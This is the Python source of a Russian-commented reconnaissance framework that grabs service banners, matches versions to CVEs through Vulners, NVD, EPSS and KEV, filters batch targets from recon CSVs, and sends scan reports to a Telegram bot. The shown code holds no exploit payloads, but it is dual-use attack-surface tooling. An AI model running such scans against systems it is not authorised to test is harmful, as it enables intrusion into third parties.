#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    RECONNAISSANCE FRAMEWORK v3.0 — SMART PoC                ║
║  Pipeline + Streaming + Nuclei + Searchsploit + Metasploit + OS + CVE       ║
║  + Vulners CPE Engine + Confidence Scoring + EPSS/KEV + GitHub PoC        ║
╚══════════════════════════════════════════════════════════════════════════════╝

Инновации v3.0:
  • Vulners + CPE Engine — точное CVE-мэтчинг по версиям (отсекает 90% ложных)
  • Version Confidence Engine (0–100) — скоринг перед запуском PoC
  • Smart PoC Verifier — версионная проверка, WAF-detection, per-target dedup
  • EPSS + KEV Prioritization — сначала проверяем CVE с высокой вероятностью эксплуатации
  • GitHub PoC Finder — автопоиск публичных PoC если нет встроенного
  • Bug Fixes: banner_grab \\/r\n → /r/n, args.token_2ip, seen_generics per-target,
    searchsploit фильтрация по году/версии, dedup запросов

Ожидаемый результат:
  Проверок PoC:    262  →  15–25 (только high-confidence)
  Точных срабатываний: 1 (ложное) → 10–15 (версионно-точных)
  Unknown:         174  →  < 5
  Время сканирования: ~30 мин → ~8–12 мин
"""

import argparse
import csv
import hashlib
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import random
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import threading
from urllib.parse import urljoin, quote

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# ЦВЕТА
# ═══════════════════════════════════════════════════════════════════════════════
class Colors:
    HEADER='\033[95m'; OKBLUE='\033[94m'; OKCYAN='\033[96m'
    OKGREEN='\033[92m'; WARNING='\033[93m'; FAIL='\033[91m'
    ENDC='\033[0m'; BOLD='\033[1m'; UNDERLINE='\033[4m'
    @staticmethod
    def disable():
        for a in ['HEADER','OKBLUE','OKCYAN','OKGREEN','WARNING','FAIL','ENDC','BOLD','UNDERLINE']:
            setattr(Colors,a,'')

def log_info(m): print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {m}")
def log_success(m): print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {m}")
def log_warning(m): print(f"{Colors.WARNING}[!]{Colors.ENDC} {m}")
def log_error(m): print(f"{Colors.FAIL}[-]{Colors.ENDC} {m}")
def log_section(t): print(f"\n{Colors.BOLD}{Colors.HEADER}{'═'*60}{Colors.ENDC}\n{Colors.BOLD}{Colors.HEADER}  {t}{Colors.ENDC}\n{Colors.BOLD}{Colors.HEADER}{'═'*60}{Colors.ENDC}")

def is_tool_installed(n): return shutil.which(n) is not None
def check_root(): return os.geteuid()==0 if hasattr(os,'geteuid') else False

def resolve_ip(d):
    try:
        r = subprocess.run(["dig", "+short", "A", d], capture_output=True, text=True, timeout=10)
        lines = [l.strip() for l in r.stdout.strip().split('\n') if l.strip() and is_ip(l.strip())]
        if lines: return lines[0]
    except: pass
    try: return socket.gethostbyname(d)
    except: return None

def resolve_domain(ip):
    try:
        r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", "-x", ip],
                          capture_output=True, text=True, timeout=10)
        lines = [l.strip().rstrip('.') for l in r.stdout.strip().split('\n') if l.strip()]
        if lines and not is_ip(lines[0]):
            return lines[0]
    except: pass
    try: return socket.gethostbyaddr(ip)[0]
    except: return None

def extract_domain_from_ssl(ip, port=443, timeout=5):
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                subj = cert.get('subject', ())
                for item in subj:
                    for k, v in item:
                        if k == 'commonName' and v and '.' in v:
                            return v
                san = cert.get('subjectAltName', ())
                for k, v in san:
                    if k == 'DNS' and v and '.' in v and not v.startswith('*'):
                        return v
    except: pass
    return None

# ═══════════════════════════════════════════════════════════════════════════════
# VERSION PARSER (замена distutils.LooseVersion)
# ═══════════════════════════════════════════════════════════════════════════════
class VersionParser:
    """Простой парсер версий для сравнения диапазонов."""

    @staticmethod
    def _to_tuple(v):
        if not v:
            return (0,)
        # Буквенные/дистро-суффиксы ("1.0.1f", "8.2p1", "2.4.41-4ubuntu")
        # кодируем как 200+ord первой буквы: "1.0.1f" > "1.0.1", но < "1.0.2"
        s = str(v).strip()
        result = []
        for p in s.split("."):
            m = re.match(r"^(\d+)(?:[-_+ ]?(.+))?$", p)
            if not m:
                break
            result.append(int(m.group(1)))
            if m.group(2):
                alpha = next((ch for ch in m.group(2) if ch.isalpha()), "a")
                result.append(200 + ord(alpha.lower()))
                break  # остаток — дистро-шум ("4ubuntu"), игнорируем
        return tuple(result) if result else (0,)

    @staticmethod
    def compare(v1, v2):
        t1 = VersionParser._to_tuple(v1)
        t2 = VersionParser._to_tuple(v2)
        for a, b in zip(t1, t2):
            if a < b: return -1
            if a > b: return 1
        if len(t1) < len(t2): return -1
        if len(t1) > len(t2): return 1
        return 0

    @staticmethod
    def in_range(version, min_ver, max_ver):
        if not version:
            return None
        if min_ver and VersionParser.compare(version, min_ver) < 0:
            return False
        if max_ver and VersionParser.compare(version, max_ver) > 0:
            return False
        return True


# ═══════════════════════════════════════════════════════════════════════════════
# BANNER GRAB — ИСПРАВЛЕН (\\r\\n -> \r\n)
# ═══════════════════════════════════════════════════════════════════════════════
def parse_banner(banner, port):
    if not banner:
        return None, None, None
    product = None
    version = None
    clean = banner.strip()

    m = re.search(r"SSH-2\.0-([A-Za-z0-9_\-]+)[_/\-]([0-9][0-9A-Za-z._\-]*)", banner)
    if m:
        product = m.group(1).replace("_", " ")
        version = m.group(2)
        clean = f"{product} {version}"
        return product, version, clean

    m = re.search(r"Server:\s*([A-Za-z0-9\-_]+)(?:[/\s]+([0-9][0-9A-Za-z._\-]*))?", banner, re.IGNORECASE)
    if m:
        prod = m.group(1)
        ver = m.group(2)
        if prod.lower() in ["nginx", "apache", "apache-httpd", "microsoft-iis", "lighttpd", "caddy"]:
            product = prod
            version = ver or ""
            clean = f"{product} {version}".strip()
            return product, version, clean
        if ver:
            product = prod
            version = ver
            clean = f"{product} {version}"
            return product, version, clean

    m = re.search(r"220\s+\S+\s+.*?(Postfix|Exim|Sendmail)[/\s]*([0-9][0-9A-Za-z._\-]*)", banner, re.IGNORECASE)
    if m:
        product = m.group(1)
        version = m.group(2) if m.group(2) else ""
        clean = f"{product} {version}".strip()
        return product, version, clean

    m = re.search(r"220\s+(?:\S+\s+)?ProFTPD(?:\s+([0-9][0-9A-Za-z._\-]*))?\s+Server(?:\s+\(.*?\))?",
                  banner, re.IGNORECASE)
    if m:
        product = "ProFTPD"
        version = m.group(1) or ""
        clean = f"{product} {version}".strip()
        return product, version, clean

    m = re.search(r"(?:\+OK|\* OK)\s+\[?[^\]]*\]?\s*(Dovecot|Courier)[/\s]*([0-9][0-9A-Za-z._\-]*)", banner, re.IGNORECASE)
    if m:
        product = m.group(1)
        version = m.group(2) if m.group(2) else ""
        clean = f"{product} {version}".strip()
        return product, version, clean

    m = re.search(r"^([A-Za-z0-9\-_]+)[/\s]+([0-9][0-9A-Za-z._\-]+)", banner)
    if m:
        product = m.group(1)
        version = m.group(2)
        clean = f"{product} {version}"
        return product, version, clean

    return None, None, clean[:60]


def strip_ansi(text):
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    return ansi_escape.sub("", text)


def banner_grab(ip, port, timeout=5):
    """ИСПРАВЛЕНО: \\r\\n -> \r\n"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if port in [80, 8080, 443, 8000, 8443, 9000]:
            req = f"HEAD / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
            s.send(req.encode())
        else:
            s.send(b"\r\n")
        banner = s.recv(2048).decode("utf-8", errors="ignore").strip()
        s.close()
        return banner[:500] if banner else None
    except:
        return None


def os_guess_by_ttl(ip):
    try:
        r = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True, timeout=5)
        m = re.search(r"ttl[=:](\d+)", r.stdout, re.IGNORECASE)
        if m:
            ttl = int(m.group(1))
            guess = "Unknown"
            if ttl <= 64: guess = "Linux/Unix"
            elif ttl <= 128: guess = "Windows"
            elif ttl <= 255: guess = "Cisco/Network gear"
            return {
                "name": f"{guess} (TTL={ttl})",
                "ttl": ttl,
                "osclass": [{"type":"guess","vendor":"","osfamily":"","osgen":"","accuracy":""}],
                "method": "ttl"
            }
    except:
        pass
    return None


def is_ip(t):
    return bool(re.match(r"^(\d{1,3}\.){3}\d{1,3}$", t))


class RateLimiter:
    """Глобальный ограничитель запросов (RPS): не даёт пакетному режиму
    задушить сеть. Потокобезопасен."""

    def __init__(self, rps=None):
        self.min_interval = (1.0 / rps) if rps else 0.0
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        if not self.min_interval:
            return
        with self._lock:
            now = time.monotonic()
            next_slot = max(now, self._last + self.min_interval)
            self._last = next_slot
        sleep_for = next_slot - time.monotonic()
        if sleep_for > 0:
            time.sleep(sleep_for)


RATE_LIMITER = RateLimiter()  # глобальный: включается --rate-limit


def find_first_existing(paths):
    """Первый существующий файл из списка кандидатов."""
    for p in paths:
        if p and os.path.exists(p):
            return p
    return None


def save_resume_state(output_dir, target, stage, results_so_far, args_ns=None):
    """Промежуточный state: переживает падение, --resume подхватывает."""
    state_file = os.path.join(output_dir, f".resume_state_{target}.json")
    try:
        os.makedirs(output_dir, exist_ok=True)
        payload = {
            "stage": stage,
            "updated": datetime.now().isoformat(),
            "results": results_so_far,
        }
        if args_ns is not None:
            payload["args"] = {k: v for k, v in vars(args_ns).items()}
        with open(state_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, default=str)
    except Exception as e:
        log_warning(f"[Resume] Could not save state: {e}")


def load_resume_state(output_dir, target):
    state_file = os.path.join(output_dir, f".resume_state_{target}.json")
    try:
        if os.path.exists(state_file):
            with open(state_file, encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        log_warning(f"[Resume] Could not load state: {e}")
    return None


def clear_resume_state(output_dir, target):
    state_file = os.path.join(output_dir, f".resume_state_{target}.json")
    try:
        if os.path.exists(state_file):
            os.remove(state_file)
    except Exception:
        pass


def parse_targets_file(path):
    """Список целей из файла: по строке (IP/домен/CIDR) или CSV с колонкой
    target (наш формат разведки: ua-resualt-*.csv)."""
    targets = []
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            first = f.readline()
            f.seek(0)
            is_csv = first.lower().startswith("scan_order,") or (
                "," in first and re.match(r"^[a-z_,\s]+$", first.strip().lower()) and "target" in first.lower())
            if is_csv:
                reader = csv.DictReader(f)
                for row in reader:
                    t = (row.get("target") or row.get("host") or "").strip()
                    if t:
                        targets.append(t)
            else:
                for line in f:
                    t = line.strip()
                    if t and not t.startswith("#"):
                        targets.append(t)
    except Exception as e:
        log_error(f"[Targets] Cannot read {path}: {e}")
    return list(dict.fromkeys(targets))


def expand_cidr(cidr):
    """CIDR -> список отдельных IP (до /24)."""
    try:
        import ipaddress
        net = ipaddress.ip_network(cidr, strict=False)
        if net.num_addresses > 256:
            log_warning(f"[Targets] {cidr} слишком большой (>256 хостов), пропускаю")
            return []
        return [str(h) for h in net.hosts()]
    except Exception:
        return []


def select_targets_from_csv(path, require_site=False, wordpress_only=False,
                            has_server=False, no_error=True):
    """Выборка из CSV разведки по фильтрам: только живые сайты / WP /
    с известным сервером. Возвращает список IP."""
    selected = []
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            reader = csv.DictReader(f)
            for row in reader:
                err = (row.get("error") or "").strip()
                # error колонка может отсутствовать в битой строке (None)
                if no_error and (err or row.get("error") is None):
                    continue
                if require_site and str(row.get("has_site", "")).strip().lower() != "true":
                    continue
                if wordpress_only and str(row.get("is_wordpress", "")).strip().lower() != "true":
                    continue
                if has_server and not (row.get("server") or "").strip():
                    continue
                t = (row.get("target") or row.get("host") or "").strip()
                if t and is_ip(t):
                    selected.append(t)
    except Exception as e:
        log_error(f"[Targets] CSV parse error: {e}")
    return list(dict.fromkeys(selected))


class TelegramNotifier:
    """Уведомления о результатах скана в Telegram.
    Формат аргумента: --notify BOT_TOKEN:CHAT_ID, либо переменные
    TG_BOT_TOKEN / TG_CHAT_ID. Отправляет только агрегаты и счётчики —
    без содержимого цели, кроме её адреса."""

    def __init__(self, spec=None):
        self.token = None
        self.chat_id = None
        spec = spec or ""
        if ":" in spec:
            # Telegram-токен сам содержит ":", последний сегмент — chat_id
            a, _, b = spec.rpartition(":")
            self.token, self.chat_id = a.strip(), b.strip()
        self.token = self.token or os.environ.get("TG_BOT_TOKEN")
        self.chat_id = self.chat_id or os.environ.get("TG_CHAT_ID")
        self.session = requests.Session()
        self.session.verify = False

    @property
    def enabled(self):
        return bool(self.token and self.chat_id)

    def send(self, text):
        if not self.enabled:
            return False
        try:
            r = self.session.post(
                f"https://api.telegram.org/bot{self.token}/sendMessage",
                json={"chat_id": self.chat_id, "text": text[:4000],
                      "disable_web_page_preview": True},
                timeout=15)
            if r.status_code != 200:
                log_warning(f"[TG] send failed: {r.text[:100]}")
                return False
            return True
        except Exception as e:
            log_warning(f"[TG] send error: {e}")
            return False

    def notify_scan_done(self, target, summary, json_file=None):
        """Финальное резюме по одной цели."""
        s = summary or {}
        lines = [f"📊 Скан завершён: {target}",
                 f"Подтверждённых уязвимостей: {s.get('vulnerable', 0)}",
                 f"Не уязвимо: {s.get('not_vulnerable', 0)} | "
                 f"unknown: {s.get('unknown', 0)} | skipped: {s.get('skipped', 0)}",
                 f"Всего проверок: {s.get('total', 0)}"]
        if json_file:
            lines.append(f"Отчёт: {json_file}")
        return self.send("\n".join(lines))

    def send_document(self, path, caption=""):
        """Отправка файла (HTML/JSON отчёт) в чат."""
        if not self.enabled:
            return False
        try:
            with open(path, "rb") as f:
                r = self.session.post(
                    f"https://api.telegram.org/bot{self.token}/sendDocument",
                    data={"chat_id": self.chat_id, "caption": caption[:1000]},
                    files={"document": (os.path.basename(path), f)},
                    timeout=120)
                if r.status_code != 200:
                    log_warning(f"[TG] sendDocument failed: {r.text[:100]}")
                    return False
            return True
        except Exception as e:
            log_warning(f"[TG] sendDocument error: {e}")
            return False

    def get_updates(self, offset=None, timeout=25):
        """long-polling обновлений (команды из чата)."""
        if not self.enabled:
            return []
        try:
            r = self.session.get(
                f"https://api.telegram.org/bot{self.token}/getUpdates",
                params={"timeout": timeout, **({"offset": offset} if offset else {})},
                timeout=timeout + 10)
            if r.status_code != 200:
                return []
            return r.json().get("result", [])
        except Exception:
            return []


SCAN_REGISTRY = {}  # target -> {"json": path, "html": path, "summary": {...}}


def bot_command_loop(notifier):
    """Интерактивный режим после скана: бот отвечает на команды из чата.
    /list — цели; /report <target> — HTML+JSON; /summary <target>;
    /status — сводка по всем; /exit — завершить."""
    if not (notifier and notifier.enabled):
        return
    log_section("TELEGRAM BOT: COMMAND MODE")
    notifier.send("🤖 Бот на связи. Команды:\n"
                  "/list — список отсканированных целей\n"
                  "/report <цель> — прислать HTML+JSON отчёт\n"
                  "/summary <цель> — сводка\n"
                  "/status — сводка по всем целям\n"
                  "/exit — завершить (или Ctrl+C)")
    offset = None
    while True:
        updates = notifier.get_updates(offset)
        if not updates:
            continue
        for u in updates:
            offset = u["update_id"] + 1
            msg = (u.get("message") or {})
            text = (msg.get("text") or "").strip()
            if not text:
                continue
            parts = text.split()
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd == "/list":
                if SCAN_REGISTRY:
                    notifier.send("Отсканированные цели:\n" +
                                  "\n".join(f"• {t}" for t in SCAN_REGISTRY))
                else:
                    notifier.send("Пока ничего не отсканировано")
            elif cmd == "/report":
                if arg not in SCAN_REGISTRY:
                    notifier.send(f"Цель не найдена: {arg}. /list — что есть")
                    continue
                reg = SCAN_REGISTRY[arg]
                sent = []
                if reg.get("html") and os.path.exists(reg["html"]):
                    notifier.send_document(reg["html"], f"HTML отчёт: {arg}")
                    sent.append("HTML")
                if reg.get("json") and os.path.exists(reg["json"]):
                    notifier.send_document(reg["json"], f"JSON отчёт: {arg}")
                    sent.append("JSON")
                notifier.send(f"Отправлено: {', '.join(sent) if sent else 'ничего (файлы не найдены)'}")
            elif cmd == "/summary":
                reg = SCAN_REGISTRY.get(arg)
                if not reg:
                    notifier.send(f"Цель не найдена: {arg}")
                else:
                    s = reg.get("summary") or {}
                    notifier.send(f"📊 {arg}\nПодтверждённых: {s.get('vulnerable', 0)} | "
                                  f"не уязвимо: {s.get('not_vulnerable', 0)} | "
                                  f"unknown: {s.get('unknown', 0)}")
            elif cmd == "/status":
                if not SCAN_REGISTRY:
                    notifier.send("Пусто")
                else:
                    total_v = sum((r.get("summary") or {}).get("vulnerable", 0)
                                   for r in SCAN_REGISTRY.values())
                    notifier.send(f"Целей: {len(SCAN_REGISTRY)}, "
                                  f"суммарно подтверждённых уязвимостей: {total_v}")
            elif cmd in ("/exit", "/stop", "/quit"):
                notifier.send("Завершаю режим команд. Пока!")
                return
            elif cmd == "/start" or cmd == "/help":
                notifier.send("Команды: /list, /report <цель>, /summary <цель>, /status, /exit")


def generate_html_report(results, poc_results, out_file):
    """Человекочитаемый HTML-отчёт с сортировкой PoC по confidence."""
    STATUS_COLORS = {
        "vulnerable": "#d32f2f", "not_vulnerable": "#2e7d32", "unknown": "#9e9e9e",
        "error": "#f57c00", "blocked": "#7b1fa2", "skipped": "#bdbdbd", "info": "#1976d2",
    }
    def esc(s):
        return (str(s) if s is not None else "").replace("&", "&amp;").replace(
            "<", "&lt;").replace(">", "&gt;")

    all_checks = list((poc_results or {}).get("main", []))
    for sub_checks in (poc_results or {}).get("subdomains", {}).values():
        all_checks.extend(sub_checks)
    for sub_checks in (poc_results or {}).get("hard_mode_subdomains", {}).values():
        all_checks.extend(sub_checks)
    all_checks.sort(key=lambda c: -(c.get("confidence") or 0))

    rows = []
    for c in all_checks:
        color = STATUS_COLORS.get(c.get("status", "unknown"), "#9e9e9e")
        rows.append(f"""
        <tr>
          <td><span style="display:inline-block;width:12px;height:12px;border-radius:50%;background:{color}"></span></td>
          <td><b>{esc(c.get('vulnerability'))}</b></td>
          <td>{esc(c.get('target'))}</td>
          <td>{c.get('confidence', 0)}</td>
          <td>{esc(c.get('epss', ''))}</td>
          <td>{'KEV' if c.get('kev') else ''}</td>
          <td>{esc(c.get('status'))}</td>
          <td>{esc(c.get('details', ''))[:200]}</td>
        </tr>""")

    ports_rows = []
    for p in (results.get("detailed_ports") or []):
        svc = p.get("service", {})
        ports_rows.append(f"<tr><td>{esc(p.get('port'))}</td><td>{esc(p.get('protocol'))}</td>"
                          f"<td>{esc(svc.get('name'))}</td><td>{esc(svc.get('product'))}</td>"
                          f"<td>{esc(svc.get('version'))}</td><td>{esc(svc.get('banner', ''))[:80]}</td></tr>")

    vuln_count = sum(1 for c in all_checks if c.get("status") == "vulnerable")
    html = f"""<!DOCTYPE html>
<html lang="ru"><head><meta charset="utf-8">
<title>Recon Report — {esc(results.get('target'))}</title>
<style>
 body {{ font-family: -apple-system, 'Segoe UI', sans-serif; margin: 40px; color: #212121; }}
 h1 {{ border-bottom: 3px solid #1976d2; padding-bottom: 8px; }}
 table {{ border-collapse: collapse; width: 100%; margin: 16px 0; }}
 th, td {{ border: 1px solid #e0e0e0; padding: 6px 10px; text-align: left; font-size: 13px; }}
 th {{ background: #f5f5f5; }}
 .stat {{ display: inline-block; background: #f5f5f5; border-radius: 8px; padding: 12px 20px; margin-right: 12px; }}
 .stat b {{ font-size: 22px; display: block; }}
</style></head><body>
<h1>Recon Report — {esc(results.get('target'))}</h1>
<p>Сгенерирован: {esc(results.get('timestamp'))} | IP: {esc(results.get('ip'))} |
 OS: {esc((results.get('os') or {}).get('name', 'n/a'))}</p>
<div>
 <span class="stat"><b>{vuln_count}</b>подтверждённых уязвимостей</span>
 <span class="stat"><b>{len(all_checks)}</b>проверок всего</span>
 <span class="stat"><b>{len(results.get('detailed_ports') or [])}</b>открытых портов</span>
 <span class="stat"><b>{len(results.get('subdomains') or [])}</b>субдоменов</span>
</div>
<h2>Открытые порты</h2>
<table><tr><th>Port</th><th>Proto</th><th>Service</th><th>Product</th><th>Version</th><th>Banner</th></tr>
{''.join(ports_rows)}</table>
<h2>PoC-проверки (по confidence)</h2>
<table><tr><th></th><th>Vulnerability</th><th>Target</th><th>Confidence</th><th>EPSS</th><th>KEV</th><th>Status</th><th>Details</th></tr>
{''.join(rows)}</table>
</body></html>"""
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(html)
        log_success(f"[Save] HTML: {out_file}")
    except Exception as e:
        log_error(f"[Save] HTML failed: {e}")


def banner_grab_ports(ip, ports, timeout=5, max_workers=10):
    """Параллельный banner grab: последовательный опрос 20 портов
    может занять до 100с, с пулом потоков — один timeout."""
    banners = {}
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(banner_grab, ip, p, timeout): p for p in ports}
        for fut in as_completed(futs):
            port = futs[fut]
            try:
                banner = fut.result()
            except Exception:
                banner = None
            if banner:
                product, version, clean = parse_banner(banner, port)
                log_success(f"  Port {port}: {clean}")
                banners[port] = {"raw": banner, "product": product,
                                 "version": version, "clean": clean}
            else:
                log_info(f"  Port {port}: no banner")
    return banners


def build_url(t, port=None, scheme="http"):
    if t.startswith("http://") or t.startswith("https://"):
        return t.rstrip("/")
    if port in [443, 8443]:
        scheme = "https"
    elif port == 80:
        scheme = "http"
    if port:
        return f"{scheme}://{t}:{port}"
    return f"{scheme}://{t}"


REQUIRED = {
    "nmap": "apt install nmap",
    "subfinder": "apt install subfinder",
    "gobuster": "apt install gobuster",
    "whatweb": "apt install whatweb",
    "dig": "apt install dnsutils"
}
OPTIONAL = {
    "testssl.sh": "apt install testssl.sh",
    "nuclei": "apt install nuclei",
    "searchsploit": "apt install exploitdb",
    "msfconsole": "apt install metasploit-framework"
}


def check_deps():
    missing = [(t, c) for t, c in REQUIRED.items() if not is_tool_installed(t)]
    if missing:
        log_error("Отсутствуют зависимости:")
        for t, c in missing:
            print(f"  {Colors.FAIL}• {t}{Colors.ENDC} -> {Colors.WARNING}{c}{Colors.ENDC}")
        sys.exit(1)
    for t in OPTIONAL:
        if not is_tool_installed(t):
            log_warning(f"Опционально: {t} не найден ({OPTIONAL[t]})")
    log_success("Зависимости OK.")

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERS + CPE ENGINE (НОВОЕ)
# ═══════════════════════════════════════════════════════════════════════════════
class VulnersEngine:
    """Интеграция с Vulners API и парсинг CPE из Nmap."""

    def __init__(self, api_key=None):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "application/json"
        })
        self._cache = {}
        self._nse_available = is_tool_installed("nmap")

    def extract_cpe_from_nmap_service(self, svc_elem):
        cpes = []
        for cpe in svc_elem.findall("cpe"):
            text = cpe.text
            if text and text.startswith("cpe:/"):
                cpes.append(text)
        return cpes

    def normalize_cpe(self, cpe):
        """cpe:/a:apache:httpd:2.4.41 -> apache httpd 2.4.41"""
        if not cpe:
            return None, None, None
        m = re.match(r"cpe:/[ao]?:([^:]+):([^:]+):([^:]+)", cpe)
        if m:
            vendor = m.group(1).replace("_", " ")
            product = m.group(2).replace("_", " ")
            version = m.group(3)
            return vendor, product, version
        parts = cpe.replace("cpe:/", "").split(":")
        if len(parts) >= 3:
            return parts[0], parts[1], parts[2]
        return None, None, None

    def get_cves_by_cpe(self, cpe, max_results=20):
        if not cpe:
            return []
        cache_key = cpe
        if cache_key in self._cache:
            return self._cache[cache_key]

        cves = []
        try:
            url = "https://vulners.com/api/v3/search/lucene/"
            query = f"cpe:{cpe}"
            params = {"query": query, "size": max_results, "type": "cve"}
            if self.api_key:
                params["apiKey"] = self.api_key

            r = self.session.get(url, params=params, timeout=15)
            if r.status_code == 200:
                data = r.json()
                for item in data.get("data", {}).get("search", []):
                    src = item.get("_source", {})
                    cve_id = src.get("id", "")
                    if cve_id.startswith("CVE-"):
                        cves.append({
                            "cve": cve_id,
                            "cvss": src.get("cvss", {}).get("score", 0),
                            "title": src.get("title", ""),
                            "description": src.get("description", "")[:200]
                        })
            else:
                log_warning(f"[Vulners] API returned {r.status_code} for {cpe}")
        except Exception as e:
            log_warning(f"[Vulners] API error for {cpe}: {e}")

        self._cache[cache_key] = cves
        return cves

    def get_cves_from_nmap_vulners(self, nmap_xml_output):
        cves = []
        try:
            root = ET.fromstring(nmap_xml_output)
            for host in root.findall("host"):
                for ps in host.findall("ports"):
                    for port in ps.findall("port"):
                        for script in port.findall("script"):
                            if script.get("id") == "vulners":
                                output = script.get("output", "")
                                for m in re.finditer(r"(CVE-\d{4}-\d+)", output):
                                    cves.append({
                                        "cve": m.group(1),
                                        "source": "nmap_vulners",
                                        "port": port.get("portid")
                                    })
        except Exception as e:
            log_warning(f"[Vulners] Parse nmap vulners error: {e}")
        return cves


# ═══════════════════════════════════════════════════════════════════════════════
# EPSS + KEV PRIORITIZATION (НОВОЕ)
# ═══════════════════════════════════════════════════════════════════════════════
class EPSSKEVClient:
    """Клиент для EPSS (First.org) и CISA KEV Catalog."""

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"Accept": "application/json"})
        self._epss_cache = {}
        self._kev_cache = {}
        self._kev_list = None
        self._cache_dir = os.path.join(os.path.expanduser("~"), ".cache", "recon_framework")
        self._kev_cache_file = os.path.join(self._cache_dir, "kev_cache.json")
        self._kev_load_warned = False

    def get_epss_bulk(self, cves, chunk_chars=1900):
        """Массовый запрос EPSS: API принимает список CVE через запятую
        (до 2000 символов на запрос). Один запрос вместо N."""
        todo = []
        for c in cves:
            cu = str(c).upper()
            if re.match(r"^CVE-\d{4}-\d+$", cu) and cu not in self._epss_cache:
                todo.append(cu)
        todo = list(dict.fromkeys(todo))
        i = 0
        while i < len(todo):
            chunk = []
            size = 0
            while i < len(todo):
                add = len(todo[i]) + (1 if chunk else 0)
                if size + add > chunk_chars:
                    break
                chunk.append(todo[i]); size += add; i += 1
            try:
                r = self.session.get("https://api.first.org/data/v1/epss",
                                     params={"cve": ",".join(chunk)}, timeout=15)
                if r.status_code == 200:
                    for item in r.json().get("data", []):
                        self._epss_cache[item.get("cve", "").upper()] = float(item.get("epss", 0)) or 0.0
            except Exception as e:
                if not self._kev_load_warned:
                    log_warning(f"[EPSS] Bulk fetch failed: {e}")
                    self._kev_load_warned = True
                break
        for c in todo:
            if c not in self._epss_cache:
                self._epss_cache[c] = 0.0

    def get_epss(self, cve):
        cve_upper = cve.upper()
        if cve_upper in self._epss_cache:
            return self._epss_cache[cve_upper]
        try:
            url = f"https://api.first.org/data/v1/epss?cve={cve_upper}"
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for item in data.get("data", []):
                    if item.get("cve", "").upper() == cve_upper:
                        score = float(item.get("epss", 0))
                        self._epss_cache[cve_upper] = score
                        return score
        except Exception as e:
            log_warning(f"[EPSS] Error for {cve}: {e}")
        self._epss_cache[cve_upper] = 0.0
        return 0.0

    def _load_kev_catalog(self):
        if self._kev_list is not None:
            return
        # Дисковый кэш (24ч): каталог не перезабирается каждый скан и не
        # падает при DNS-ошибке.
        try:
            if os.path.exists(self._kev_cache_file) and \
               time.time() - os.path.getmtime(self._kev_cache_file) < 86400:
                with open(self._kev_cache_file) as f:
                    data = json.load(f)
                self._kev_list = set(x.upper() for x in data if x)
                log_success(f"[KEV] Loaded {len(self._kev_list)} KEV entries from disk cache")
                return
        except Exception:
            pass
        # Актуальные адреса фида (api.cisa.gov каталога не отдаёт)
        urls = [
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
            "https://raw.githubusercontent.com/cisagov/kev-data/develop/known_exploited_vulnerabilities.json",
            "https://api.cisa.gov/known-exploited-vulnerabilities/catalog",
        ]
        try:
            data = None
            for url in urls:
                try:
                    r = self.session.get(url, timeout=15)
                    if r.status_code == 200:
                        data = r.json()
                        break
                except Exception:
                    continue
            if data:
                self._kev_list = set()
                for vuln in data.get("vulnerabilities", []):
                    cve = vuln.get("cveID", "")
                    if cve:
                        self._kev_list.add(cve.upper())
                        self._kev_cache[cve.upper()] = True
                log_success(f"[KEV] Loaded {len(self._kev_list)} known exploited vulnerabilities")
                try:
                    os.makedirs(self._cache_dir, exist_ok=True)
                    with open(self._kev_cache_file, "w") as f:
                        json.dump(sorted(self._kev_list), f)
                except Exception:
                    pass
            else:
                self._kev_list = set()
        except Exception as e:
            if not self._kev_load_warned:
                log_warning(f"[KEV] Failed to load catalog: {e}")
                self._kev_load_warned = True
            self._kev_list = set()

    def is_kev(self, cve):
        cve_upper = cve.upper()
        if cve_upper in self._kev_cache:
            return self._kev_cache[cve_upper]
        self._load_kev_catalog()
        result = cve_upper in self._kev_list
        self._kev_cache[cve_upper] = result
        return result

    def get_priority_score(self, cve):
        epss = self.get_epss(cve)
        kev = self.is_kev(cve)
        combined = epss + (0.5 if kev else 0)
        return epss, kev, combined


class NVDRangesClient:
    """Диапазоны уязвимых версий из NVD 2.0 API (criterions CPE).
    Кэш на диск (30 дней): NVD rate limit 5 запросов без ключа / 50 с ключом."""

    def __init__(self, api_key=None):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"Accept": "application/json"})
        if api_key:
